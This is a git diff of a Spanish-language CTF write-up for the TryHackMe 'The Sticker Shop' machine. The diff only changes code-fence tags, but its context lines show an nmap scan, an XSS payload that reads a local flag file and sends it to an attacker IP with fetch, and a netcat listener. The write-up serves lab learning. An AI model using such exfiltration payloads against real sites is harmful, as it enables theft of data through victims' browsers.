@@ -30,7 +30,7 @@ Su tienda local de pegatinas finalmente ha desarrollado su propia página web. N
 
 Para el reconocimiento vamos a hacer un escaneo rápido de puertos a la ip de la máquina.
 
-```tmux
+```bash
 nmap -F 10.129.180.138
 ```
 ![Escaneo de puertos para ver qué tipo de máquina tenemos delante](/images/writeups/TryHackMe_imágenes/The_Sticker_Shop_THM_imágenes/Nmap_ip_The_Sticker_Shop.png)
@@ -81,7 +81,7 @@ Y aquí está la clave de la pista del enunciado: "alojan todo en el mismo orden
 Sabiendo esto, voy a crear un payload que, al ejecutarse en el navegador de la máquina, lea la flag desde `localhost:8080/flag.txt` (a la que solo esa máquina tiene acceso) y me la envíe a mí mediante una petición a un servidor, que en este caso será mi máquina usando NetCat.
 
 
-```tmux
+```bash
 <img src=x onerror="fetch('http://127.0.0.1:8080/flag.txt').then(r=>r.text()).then(d=>fetch('http://192.168.134.213:8000/?data='+d))">
 ```
 
@@ -95,7 +95,7 @@ Resumidamente lo que hace este payload es lo siguiente:
 
 Pero para que ese payload funcione, necesito levantar el listener para que escuche la información que nos envíe, para eso voy a usar netcat.
 
-```tmux
+```bash
 nc -lnvp 8000
 ```
 
